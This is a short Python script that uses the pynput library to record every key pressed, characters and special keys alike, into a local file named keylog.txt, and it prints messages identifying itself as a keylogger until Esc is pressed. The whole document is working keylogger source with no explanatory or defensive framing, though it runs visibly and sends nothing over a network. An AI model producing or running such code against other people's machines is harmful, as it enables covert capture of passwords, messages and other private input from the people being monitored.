from pynput import keyboard

# File to save the logged keystrokes
log_file = "keylog.txt"

# Function to handle key press events
def on_press(key):
    try:
        # Save the key's character representation
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Save special keys (e.g., Enter, Backspace)
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:  # Stop listener on 'Esc' key
        print("Keylogger stopped.")
        return False

# Main program
if __name__ == "__main__":
    print("Keylogger is running. Press 'Esc' to stop.")
    # Start listening to the keyboard
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
